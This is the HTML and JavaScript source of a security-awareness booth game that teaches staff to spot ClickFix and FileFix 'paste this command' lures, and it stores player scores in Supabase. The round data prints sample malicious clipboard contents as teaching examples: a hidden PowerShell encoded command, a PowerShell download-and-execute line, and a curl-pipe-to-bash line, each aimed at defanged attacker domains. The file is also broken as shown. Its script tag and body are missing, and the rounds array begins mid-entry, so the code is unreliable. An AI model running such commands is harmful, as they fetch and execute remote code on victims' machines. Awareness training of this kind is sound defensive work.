<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Paste or Pass — ClickFix booth challenge — Cyber Awareness Month 2026</title>
<style>
  /* ---- Edit these two lines for your site ---- */
  /* Reporting channel shown on the results screen is set in the REPORT_TO constant near the bottom. */

  :root{
    --ink:#191C1F;
    --panel:#23282D;
    --edge:#343B42;
    --paper:#EDEAE4;
    --steel:#8D959D;
    --hivis:#FFC20E;
    --stop:#C8102E;
    --go:#12885A;
    --sans:"Helvetica Neue",Helvetica,Arial,sans-serif;
    --mono:ui-monospace,"SF Mono",Menlo,Consolas,"Courier New",monospace;
  }
  *{box-sizing:border-box}
  html,body{height:100%}
  body{
    margin:0;background:var(--ink);color:var(--paper);font-family:var(--sans);
    -webkit-font-smoothing:antialiased;display:flex;align-items:center;justify-content:center;
    padding:16px;padding-top:64px;
  }
  .topbar{
    position:fixed;top:14px;left:16px;z-index:50;display:flex;align-items:center;gap:10px;
    background:rgba(35,40,45,.92);border:1px solid var(--edge);border-radius:8px;
    padding:7px 14px 7px 10px;
  }
  .topbar img{height:26px;width:auto;flex:none;display:block}
  .topbar .brand{font-size:13px;font-weight:700;letter-spacing:.01em;color:var(--paper);line-height:1.2}
  .topbar .brand small{display:block;font-size:10.5px;font-weight:500;color:var(--steel);letter-spacing:.02em}
  .stage{width:100%;max-width:860px}

  /* ---------- start / instructions ---------- */
  .start h1{
    font-size:clamp(40px,9vw,86px);line-height:.92;letter-spacing:-.03em;
    font-weight:800;margin:0 0 18px;
  }
  .start h1 em{font-style:normal;color:var(--hivis)}
  .start p{font-size:clamp(16px,2.4vw,21px);line-height:1.5;color:#C9C6C0;max-width:52ch;margin:0 0 10px}
  .rule{
    border-left:4px solid var(--hivis);padding:14px 0 14px 18px;margin:22px 0 26px;
    font-size:clamp(17px,2.6vw,23px);line-height:1.4;font-weight:600;max-width:54ch;
  }
  .tally{color:var(--steel);font-size:14px;margin-top:22px}
  .eyebrow{font-size:12.5px;font-weight:700;letter-spacing:.06em;text-transform:uppercase;color:var(--hivis);margin:0 0 10px}

  .howto{list-style:none;margin:0 0 26px;padding:0;max-width:56ch}
  .howto li{display:flex;gap:14px;padding:10px 0;border-top:1px solid var(--edge);font-size:15.5px;line-height:1.45;color:#DAD7D1}
  .howto li:last-child{border-bottom:1px solid var(--edge)}
  .howto b{color:var(--paper)}
  .step-num{width:26px;height:26px;flex:none;border-radius:50%;background:var(--panel);border:1px solid var(--edge);
       color:var(--hivis);font-size:13px;font-weight:800;display:flex;align-items:center;justify-content:center}

  .field{margin:18px 0 0;max-width:380px}
  .field label{display:block;font-size:13px;color:var(--steel);margin-bottom:6px;font-weight:600}
  .field input{
    width:100%;background:var(--panel);border:1px solid var(--edge);border-radius:6px;
    color:var(--paper);font-size:16px;padding:13px 14px;font-family:inherit
  }
  .field input::placeholder{color:#5C6167}
  .field input:focus{outline:none;border-color:var(--hivis)}
  .field-error{color:var(--stop);font-size:13.5px;margin:12px 0 0;font-weight:600}

  /* ---------- buttons ---------- */
  button{font-family:inherit;cursor:pointer;border:0}
  .big{
    background:var(--hivis);color:#191C1F;font-size:22px;font-weight:800;
    padding:20px 40px;border-radius:6px;letter-spacing:-.01em;
  }
  .big:hover{background:#FFD34F}
  .ghost{
    background:transparent;color:var(--steel);border:1px solid var(--edge);
    padding:12px 22px;border-radius:6px;font-size:15px;font-weight:600;
  }
  .ghost:hover{color:var(--paper);border-color:var(--steel)}
  button:focus-visible{outline:3px solid var(--hivis);outline-offset:3px}

  /* ---------- round chrome ---------- */
  .meta{display:flex;align-items:center;gap:14px;margin-bottom:12px}
  .pips{display:flex;gap:6px;flex:1}
  .pip{height:5px;flex:1;background:var(--edge);border-radius:3px}
  .pip.done{background:var(--steel)}
  .pip.now{background:var(--hivis)}
  .count{font-size:13px;color:var(--steel);font-variant-numeric:tabular-nums}
  .clock{height:3px;background:var(--edge);border-radius:2px;overflow:hidden;margin-bottom:20px}
  .clock i{display:block;height:100%;background:var(--hivis);width:100%;transform-origin:left}
  .prompt{font-size:clamp(19px,3.2vw,25px);font-weight:700;line-height:1.3;color:var(--paper);margin:0 0 14px}

  /* ---------- the mock screen ---------- */
  .screen{
    background:#0F1113;border:1px solid var(--edge);border-radius:8px;overflow:hidden;
    box-shadow:0 18px 40px rgba(0,0,0,.45);
  }
  .bar{
    display:flex;align-items:center;gap:8px;padding:9px 12px;background:#1A1E22;
    border-bottom:1px solid var(--edge);font-size:12px;color:var(--steel)
  }
  .dot{width:9px;height:9px;border-radius:50%;background:#3B424A}
  .url{
    flex:1;background:#0F1113;border-radius:4px;padding:5px 10px;color:#A7ADB4;
    font-family:var(--mono);font-size:11.5px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis
  }
  .body{padding:26px 24px;background:#F6F5F2;color:#1A1D20}
  .body.dark{background:#12161A;color:#E7E5E1}
  .body h3{margin:0 0 10px;font-size:23px;font-weight:700;letter-spacing:-.01em}
  .body p{margin:0 0 12px;font-size:17px;line-height:1.5}
  .body .muted{color:#5C6167;font-size:15.5px}
  .body.dark .muted{color:#969CA3}
  .steps{margin:14px 0 0;padding:0;list-style:none;font-size:17px}
  .steps li{display:flex;gap:10px;align-items:flex-start;padding:6px 0}
  .key{
    font-family:var(--mono);font-size:13.5px;background:#E3E0DA;border:1px solid #CBC7BF;
    border-bottom-width:2px;border-radius:4px;padding:3px 8px;white-space:nowrap;color:#1A1D20
  }
  .body.dark .key{background:#232A31;border-color:#333C45;color:#E7E5E1}
  .cmdbox{
    font-family:var(--mono);font-size:13.5px;background:#E9E7E2;border:1px solid #CFCBC3;
    border-radius:4px;padding:10px 12px;color:#3C4149;word-break:break-all;margin-top:6px
  }
  .cta{
    display:inline-block;margin-top:14px;background:#2C6FD1;color:#fff;border-radius:5px;
    padding:10px 20px;font-size:16px;font-weight:600
  }
  .cta.grey{background:#4A5158}
  .box{border:1px solid #CFCBC3;background:#fff;border-radius:6px;padding:14px;display:flex;align-items:center;gap:12px}
  .check{width:22px;height:22px;border:2px solid #9AA1A8;border-radius:3px;background:#fff;flex:none}
  .brandline{font-size:11px;color:#7A8087;margin-left:auto;text-align:right;line-height:1.3}
  .qr{width:74px;height:74px;flex:none;background:
     repeating-linear-gradient(90deg,#1A1D20 0 6px,#fff 6px 12px),
     repeating-linear-gradient(0deg,#1A1D20 0 6px,transparent 6px 12px);
     background-blend-mode:multiply;border:4px solid #fff;outline:1px solid #CFCBC3}
  .sticker{background:#FFF4CC;border:1px dashed #C9A227;border-radius:6px;padding:14px;display:flex;gap:14px;align-items:center}

  /* ---------- answers ---------- */
  .answers{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:16px}
  .ans{
    padding:20px 16px;border-radius:7px;font-size:19px;font-weight:800;line-height:1.2;
    background:var(--panel);color:var(--paper);border:1px solid var(--edge);text-align:center
  }
  .ans span{display:block;font-size:14px;font-weight:500;color:var(--steel);margin-top:6px}
  .ans:hover{border-color:var(--steel)}
  .ans.pick-safe:hover{background:#1E2A25}
  .ans.pick-attack:hover{background:#2A1E20}

  /* ---------- verdict ---------- */
  .verdict{margin-top:16px;border-radius:7px;overflow:hidden;border:1px solid var(--edge)}
  .vhead{padding:14px 18px;font-size:20px;font-weight:800;color:#191C1F}
  .vhead.ok{background:var(--go);color:#fff}
  .vhead.no{background:var(--stop);color:#fff}
  .vbody{padding:16px 18px;background:var(--panel);font-size:17px;line-height:1.55}
  .vbody b{color:var(--hivis);font-weight:700}
  .clip{font-family:var(--mono);font-size:12.5px;background:#14181C;border:1px solid var(--edge);
        border-radius:4px;padding:9px 11px;color:#C9C6C0;margin-top:10px;word-break:break-all}
  .next{margin-top:14px;display:flex;justify-content:flex-end}

  /* ---------- results ---------- */
  .score{font-size:clamp(56px,14vw,120px);font-weight:800;line-height:.85;letter-spacing:-.04em;margin:0}
  .score small{font-size:.3em;font-weight:600;color:var(--steel);letter-spacing:0}
  .grade{font-size:clamp(20px,3.4vw,30px);font-weight:700;margin:16px 0 6px;color:var(--hivis)}
  .takeaways{list-style:none;padding:0;margin:20px 0 0;max-width:56ch}
  .takeaways li{display:flex;gap:12px;padding:9px 0;border-top:1px solid var(--edge);font-size:15.5px;line-height:1.45}
  .num{width:24px;height:24px;flex:none;border-radius:50%;background:var(--hivis);color:#191C1F;
       font-size:13px;font-weight:800;display:flex;align-items:center;justify-content:center}
  .foot{display:flex;gap:12px;margin-top:26px;flex-wrap:wrap;align-items:center}

  @media (max-width:560px){
    .answers{grid-template-columns:1fr}
    .body{padding:20px 16px}
  }
  @media (prefers-reduced-motion:reduce){ .clock i{transition:none !important} }
</style>
</head>

const REPORT_TO = "the Cyber Defence Centre";
const SECONDS_PER_ROUND = 20;
/* ---- Score storage: Supabase (free tier) ----
   The page can only ADD rows (see setup.sql). Nobody can read scores with
   this key. View the live table and export CSV in the Supabase dashboard,
   which needs your Supabase login. The publishable key is designed to be
   public; the secret key must never go in this file. */
const SUPABASE_URL = "https://gezodihpfrqkjozfbdpp.supabase.co";
const SUPABASE_KEY = "sb_publishable_tmvIPwwPGHPAjtn8vk4_kQ_G0va495n";

/* Scores wait in an outbox on this device until Supabase accepts them.
   Some networks block supabase.co (DNS lookup fails), so a score that can't
   be sent is kept and resent every 15 s, on reconnect and on the next page
   load, e.g. once the phone switches to mobile data. */
const OUTBOX_KEY = "pop-outbox";
let outboxMem = [];
function readOutbox(){ try { return JSON.parse(localStorage.getItem(OUTBOX_KEY) || "[]"); } catch { return outboxMem; } }
function writeOutbox(list){ outboxMem = list; try { localStorage.setItem(OUTBOX_KEY, JSON.stringify(list)); } catch {} }

function showSaveStatus(id, text, ok){
  const el = document.getElementById("save-status");
  if (el && el.dataset.id === id) { el.textContent = text; el.style.color = ok ? "var(--steel)" : "#FF8A80"; }
}

function postScore(row){
  /* No keepalive: some browsers refuse keepalive requests that need a CORS
     preflight (the apikey header triggers one), so the row never arrived. */
  return fetch(`${SUPABASE_URL}/rest/v1/scores`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "apikey": SUPABASE_KEY,
      "Prefer": "return=minimal"   /* insert only, ask for nothing back */
    },
    body: JSON.stringify(row)
  });
}

let flushing = false, flushAgain = false, flushTimer = null;
async function flushOutbox(){
  if (flushing) { flushAgain = true; return; }
  flushing = true; flushAgain = false;
  try {
    for (const item of readOutbox()) {
      let keep = false;
      try {
        const res = await postScore(item.row);
        if (res.ok) { console.info("[Paste or Pass] score saved"); showSaveStatus(item.id, "✓ Score saved", true); }
        else if (res.status >= 500) keep = true;
        else { /* rejected for good (bad data or key): retrying won't help */
          console.warn("[Paste or Pass] score NOT saved:", res.status, await res.text());
          showSaveStatus(item.id, "Score NOT saved (" + res.status + "). Please tell the booth staff.", false);
        }
      } catch (err) {
        keep = true;
        console.warn("[Paste or Pass] score NOT saved yet:", err && err.message ? err.message : err);
        showSaveStatus(item.id, "Can't reach the score server on this network. Your score is kept on this phone and will send automatically. Try switching to mobile data and keep this page open.", false);
      }
      if (!keep) writeOutbox(readOutbox().filter(x => x.id !== item.id));
    }
  } finally { flushing = false; }
  if (flushAgain) return flushOutbox();
  clearTimeout(flushTimer);
  if (readOutbox().length) flushTimer = setTimeout(flushOutbox, 15000);
}
window.addEventListener("online", flushOutbox);

function saveToSupabase(entry){
  const id = Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
  const el = document.getElementById("save-status");
  if (el) el.dataset.id = id;
  writeOutbox(readOutbox().concat({ id, row: {
    first_name: entry.firstName.slice(0, 40),
    last_name: entry.lastName.slice(0, 40),
    score: entry.score,
    total: entry.total,
    grade: entry.grade.slice(0, 80),
    fooled: entry.fooled
  }}));
  flushOutbox().catch(() => {}); /* never block the player */
}

        <ul class="steps">
          <li><span class="key">Ctrl</span> <span class="key">C</span> <span>Copy the path (done for you)</span></li>
          <li><span class="key">Win</span> <span class="key">E</span> <span>Open File Explorer</span></li>
          <li><span class="key">Ctrl</span> <span class="key">V</span> <span class="key">Enter</span> <span>Paste into the address bar</span></li>
        </ul>
        <div class="cmdbox">\\\\fileshare\\inspection\\report-Q3.pdf</div>
      </div>`,
    why: "This is FileFix — the same trick moved into the File Explorer address bar, which also runs commands. It is popular because it slips past download warnings and the Mark-of-the-Web prompt entirely. What is shown to you is not what is on the clipboard.",
    clip: "clipboard actually contained: powershell.exe -nop -w hidden -e SQBFAFgA…            \\\\fileshare\\inspection\\report-Q3.pdf"
  },
  {
    kind: "fake",
    prompt: "You're invited to try a new company AI assistant.",
    chrome: { url: "https://ai-copilot-setup[.]com/activate" },
    screen: `
      <div class="body">
        <h3>Finish setting up Company Copilot</h3>
        <p class="muted">Your licence is active. Run the activation script below once to link your account.</p>
        <ul class="steps">
          <li><span class="key">Win</span> <span class="key">R</span> <span>Open Run</span></li>
          <li><span class="key">Ctrl</span> <span class="key">V</span> <span class="key">Enter</span> <span>Activate</span></li>
        </ul>
        <div class="cmdbox">Activation script copied ✓</div>
      </div>`,
    why: "New tools are exactly what attackers impersonate, because you expect an unfamiliar setup step. Genuine rollouts install through the Company Portal or your admin — they never ask you to paste an activation script into Run.",
    clip: "clipboard contained: powershell -w hidden -Command IEX(New-Object Net.WebClient).DownloadString('hxxps://ai-copilot-setup[.]com/a.ps1')"
  },
  {
    kind: "fake",
    prompt: "You're on a Mac, reading an article, when this pops up.",
    chrome: { url: "https://mac-security-check[.]app/verify" },
    screen: `
      <div class="body">
        <h3>Human verification required</h3>
        <p class="muted">Automated traffic detected from your network. Complete verification in Terminal to continue.</p>
        <ul class="steps">
          <li><span class="key">⌘</span> <span class="key">Space</span> <span>Open Spotlight, type Terminal</span></li>
          <li><span class="key">⌘</span> <span class="key">V</span> <span class="key">return</span> <span>Paste and run the token</span></li>
        </ul>
        <div class="cmdbox">Verification token copied ✓</div>
      </div>`,
    why: "Macs are not exempt. The same technique targets Terminal, and a newer version opens Script Editor for you with the script already loaded, so all you do is press run. If a website mentions Terminal, close the tab.",
    clip: "clipboard contained: curl -s hxxps://mac-security-check[.]app/i | bash  # token"
  }
];

/* ---------------- state ---------------- */
let idx = 0, score = 0, timer = null, answered = false;
const session = { players: 0, fooled: 0, participant: null };
const stage = document.getElementById("stage");

/* ---------------- screens ---------------- */
function renderRegister(){
  clearTimer();
  const t = session.players
    ? `<div class="tally">${session.players} played at this booth · ${session.fooled} would have pasted at least once</div>` : "";
  stage.innerHTML = `
    <div class="start">
      <p class="eyebrow">Cyber Awareness Month 2026</p>
      <h1>Paste or<br><em>Pass?</em></h1>
      <p>Quick sign-in before you start — we use this to track scores across the booth.</p>
      <div class="field">
        <label for="p-first">First name</label>
        <input type="text" id="p-first" autocomplete="given-name">
      </div>
      <div class="field">
        <label for="p-last">Last name</label>
        <input type="text" id="p-last" autocomplete="family-name">
      </div>
      <p class="field-error" id="reg-error" style="display:none"></p>
      <button class="big" id="reg-go" style="margin-top:18px">Continue</button>
      ${t}
    </div>`;

  const go = () => {
    const firstName = document.getElementById("p-first").value.trim();
    const lastName = document.getElementById("p-last").value.trim();
    const err = document.getElementById("reg-error");
    if (!firstName || !lastName){
      err.textContent = "Enter your first and last name to continue.";
      err.style.display = "block";
      return;
    }
    session.participant = { firstName, lastName };
    renderInstructions();
  };

  document.getElementById("reg-go").onclick = go;
  document.getElementById("p-last").addEventListener("keydown", e => { if (e.key === "Enter") go(); });
  document.getElementById("p-first").focus();
}

function renderInstructions(){
  clearTimer();
  const first = session.participant ? session.participant.firstName : "";
  stage.innerHTML = `
    <div class="start">
      <p class="eyebrow">Cyber Awareness Month 2026</p>
      <h1>Paste or<br><em>Pass?</em></h1>
      <p>${first ? `Hi ${first}, attackers` : "Attackers"} stopped sending you malware. Now they talk you into running it yourself.</p>
      <ol class="howto" style="list-style:none">
        <li><span class="step-num">1</span><div>You'll see <b>10 real screens</b> — the kind attackers or IT could put in front of you.</div></li>
        <li><span class="step-num">2</span><div>You get <b>${SECONDS_PER_ROUND} seconds</b> per screen. Decide fast — that's the point.</div></li>
        <li><span class="step-num">3</span><div>Pick <b>Follow it</b> if it looks legitimate, or <b>Report it</b> if you think it's an attack.</div></li>
        <li><span class="step-num">4</span><div>After every round we'll show you exactly what gave it away.</div></li>
      </ol>
      <div class="rule">If a fix asks you to paste, it is not a fix.</div>
      <button class="big" id="go">Start the challenge</button>
    </div>`;
  document.getElementById("go").onclick = () => { idx = 0; score = 0; session.players++; renderRound(); };
  document.getElementById("go").focus();
}

function renderRound(){
  answered = false;
  const r = ROUNDS[idx];
  const pips = ROUNDS.map((_, i) =>
    `<div class="pip ${i < idx ? "done" : i === idx ? "now" : ""}"></div>`).join("");
  const chrome = r.chrome ? `
    <div class="bar"><div class="dot"></div><div class="dot"></div><div class="dot"></div>
      <div class="url">${r.chrome.url}</div></div>` : "";

  stage.innerHTML = `
    <div class="meta">
      <div class="pips">${pips}</div>
      <div class="count">${idx + 1} / ${ROUNDS.length}</div>
    </div>
    <div class="clock"><i id="bar"></i></div>
    <p class="prompt">${r.prompt}</p>
    <div class="screen">${chrome}${r.screen}</div>
    <div class="answers">
      <button class="ans pick-safe" id="a-safe">Follow it<span>This looks legitimate</span></button>
      <button class="ans pick-attack" id="a-att">Report it<span>This is an attack</span></button>
    </div>
    <div id="slot"></div>`;

  document.getElementById("a-safe").onclick = () => answer("real");
  document.getElementById("a-att").onclick  = () => answer("fake");
  startTimer();
}

function startTimer(){
  const bar = document.getElementById("bar");
  bar.style.transition = `transform ${SECONDS_PER_ROUND}s linear`;
  requestAnimationFrame(() => { bar.style.transform = "scaleX(0)"; });
  timer = setTimeout(() => answer(null), SECONDS_PER_ROUND * 1000);
}
function clearTimer(){ if (timer) { clearTimeout(timer); timer = null; } }

function answer(choice){
  if (answered) return;
  answered = true;
  clearTimer();
  const bar = document.getElementById("bar");
  if (bar) { bar.style.transition = "none"; bar.style.transform = getComputedStyle(bar).transform; }

  const r = ROUNDS[idx];
  const correct = choice === r.kind;
  if (correct) score++;
  if (!correct && r.kind === "fake" && choice !== null) trackFooled();
  if (choice === null && r.kind === "fake") trackFooled();

  document.querySelectorAll(".ans").forEach(b => b.disabled = true);

  const head = choice === null
      ? (r.kind === "fake" ? "Too slow — and it was an attack" : "Time's up — that one was safe")
      : correct ? (r.kind === "fake" ? "Correct. That was an attack." : "Correct. That one was safe.")
                : (r.kind === "fake" ? "You just ran malware." : "Safe, but you reported it — no harm done.");

  const cls = correct ? "ok" : (r.kind === "fake" ? "no" : "ok");
  const last = idx === ROUNDS.length - 1;

  document.getElementById("slot").innerHTML = `
    <div class="verdict">
      <div class="vhead ${cls}">${head}</div>
      <div class="vbody">
        ${r.why}
        ${r.clip ? `<div class="clip">${r.clip}</div>` : ""}
      </div>
    </div>
    <div class="next"><button class="big" id="nx">${last ? "See your result" : "Next screen"}</button></div>`;

  const nx = document.getElementById("nx");
  nx.onclick = () => { idx++; last ? renderResult() : renderRound(); };
  nx.focus();
}

let fooledThisRun = false;
function trackFooled(){ if (!fooledThisRun) { fooledThisRun = true; session.fooled++; } }

function renderResult(){
  const grade =
    score === ROUNDS.length ? "Nothing got past you." :
    score >= 8  ? "Good instincts, one or two slips." :
    score >= 5  ? "Half of those would have landed." :
                  "Every one of those would have worked.";

  const entry = {
    firstName: session.participant ? session.participant.firstName : "",
    lastName: session.participant ? session.participant.lastName : "",
    score: score,
    total: ROUNDS.length,
    grade: grade,
    fooled: fooledThisRun,
    at: Date.now()
  };

  const first = session.participant ? session.participant.firstName : "";
  const last = session.participant ? session.participant.lastName : "";
  const t = session.players
    ? `<div class="tally">${session.players} played at this booth · ${session.fooled} would have pasted at least once</div>` : "";
  stage.innerHTML = `
    <p class="eyebrow">Cyber Awareness Month 2026</p>
    ${first ? `<p style="color:#C9C6C0;font-size:16px;margin:0 0 4px">${first}, here's how you did:</p>` : ""}
    <p class="score">${score}<small> / ${ROUNDS.length}</small></p>
    <div class="grade">${grade}</div>
    <p id="save-status" style="color:var(--steel);font-size:15px;margin:8px 0 0">Saving score…</p>
    <p class="rule" style="margin:22px 0 0">No website, error message or IT team will ever ask you to paste something into Run, PowerShell, Terminal or the File Explorer address bar. If a fix asks you to paste, it is not a fix.</p>
    <div class="foot">
      <button class="big" id="again">Next player</button>
    </div>
    ${t}`;
  saveToSupabase(entry); /* automatic — no player action needed */
  fooledThisRun = false;
  document.getElementById("again").onclick = () => { session.participant = null; renderRegister(); };
  document.getElementById("again").focus();
}

/* keyboard for kiosk operators: 1 = follow, 2 = report */
document.addEventListener("keydown", e => {
  if (e.target.tagName === "INPUT") return;
  if (e.key === "1") document.getElementById("a-safe")?.click();
  if (e.key === "2") document.getElementById("a-att")?.click();
});

renderRegister();
flushOutbox().catch(() => {}); /* send anything left over from an earlier visit */
</script>
</body>
</html>
